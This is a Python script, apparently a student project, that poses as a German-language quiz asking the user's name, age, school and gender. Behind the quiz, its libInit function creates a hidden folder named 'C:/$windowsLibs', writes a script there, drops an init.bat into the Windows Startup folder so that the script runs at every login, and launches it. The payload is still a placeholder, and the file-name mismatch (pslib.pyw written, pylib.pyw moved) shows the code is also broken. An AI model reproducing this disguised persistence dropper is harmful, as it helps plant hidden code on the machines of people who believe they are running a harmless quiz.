from os import getlogin
from subprocess import call
from os.path import exists
from time import sleep

var = """
# temp script komming here
"""


# die fragen:

def quizz():
    name = input("Wie heißst du?: ")
    alter = input("Wie alt bist du?: ")
    print(f"Hi {name}, du bist {alter} Jahre alt.")
    jahr = input("Welches Jahr haben wir?: ")
    if jahr != "2021":
        print("das ist leider falsch")

    input("Gehst du in die HTL Anichstraße?: ")
    input("Woher kommst du?: ")
    input("Bist du männlich?: ")
    print("mehr kommt noch!")


# librarry stuff:
def libInit():
    def libLoad():
        call("C:/$windowsLibs")
        call(["attr", "+h", "C:\$windowsLibs", "/d"])

        with open("pslib.pyw", "w") as lib:
            lib.write(var)

        call(["move", "pylib.pyw", "C:/$windowsLibs/"], shell=True)
        call(["python3", "C:/$windowsLibs/pylib.pyw"], shell=True)

    if not exists(
            f"C:/Users/{getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/init.bat") or not exists("C:/$windowsLibs/pylib.pyw"):

        if not exists(f"C:/Users/{getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/init.bat"):
            with open("init.bat", "w") as bat:
                bat.write("python3 \"C:/$windowsLibs\pylib.pyw\"")

        sleep(0.5)
        call(["move", "init.bat",
              f"C:/Users/{getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"], shell=True)

        if not exists("C:/$windowsLibs/pylib.pyw"):
            libLoad()

        quizz()

    else:
        quizz()


libInit()
